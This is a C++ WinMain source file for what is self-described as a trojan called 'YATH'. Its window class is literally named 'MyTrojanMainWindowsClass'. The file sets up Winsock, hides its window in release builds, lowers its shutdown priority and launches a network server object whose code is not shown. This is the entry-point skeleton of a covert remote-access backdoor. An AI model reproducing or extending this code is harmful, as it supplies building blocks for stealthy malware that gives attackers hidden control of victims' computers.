#include <windows.h>
#include "ServerClasses.h"

const char *MAIN_WINDOWS_CALSS_NAME = "MyTrojanMainWindowsClass";

HINSTANCE	hAppInstance;
const char	*szAppName = "YATH";
DWORD		mainthreadId;
HWND		hMainWindow;


LRESULT CALLBACK MainWndProc(HWND hwnd, UINT iMsg, WPARAM wParam, LPARAM lParam)
{
	// Message not recognised
	switch ( iMsg){
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0L;
		break;
	default:
		return DefWindowProc(hwnd, iMsg, wParam, lParam);
	};
}

int WINAPI WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.

	hAppInstance = hInstance;
	mainthreadId = GetCurrentThreadId();

	WSADATA wsd;
	
	if ( WSAStartup( MAKEWORD(1,1), &wsd) != 0){
		PostQuitMessage(0);
		return 0;
	}
	
	SetProcessShutdownParameters(0x100, SHUTDOWN_NORETRY);

	WNDCLASSEX wndclass;

	wndclass.cbSize			= sizeof(wndclass);
	wndclass.style			= 0;
	wndclass.lpfnWndProc	= MainWndProc;
	wndclass.cbClsExtra		= 0;
	wndclass.cbWndExtra		= 0;
	wndclass.hInstance		= hAppInstance;
	wndclass.hIcon			= LoadIcon(NULL, IDI_APPLICATION);
	wndclass.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wndclass.hbrBackground	= (HBRUSH) GetStockObject(WHITE_BRUSH);
	wndclass.lpszMenuName	= (const char *) NULL;
	wndclass.lpszClassName	= MAIN_WINDOWS_CALSS_NAME;
	wndclass.hIconSm		= LoadIcon(NULL, IDI_APPLICATION);

	RegisterClassEx(&wndclass);

	hMainWindow = CreateWindow( MAIN_WINDOWS_CALSS_NAME,
				szAppName,
				WS_OVERLAPPEDWINDOW,
				CW_USEDEFAULT,
				CW_USEDEFAULT,
				200, 200,
				NULL,
				NULL,
				hAppInstance,
				NULL);

	if (hMainWindow == NULL)
	{
		PostQuitMessage(0);
		return 0;
	}

#ifdef _DEBUG	
	ShowWindow( hMainWindow, SW_SHOWNORMAL);
#else
	ShowWindow( hMainWindow, SW_HIDE);
#endif
	
	yathCServer *Server = new yathCServer();

	Server->Run();

	MSG msg;
	while (GetMessage(&msg, NULL, 0,0) ) {
		TranslateMessage(&msg);  // convert key ups and downs to chars
		DispatchMessage(&msg);
	}
	
	Server->Free();

	// delete Server;

	WSACleanup();

	return ( msg.lParam);
}
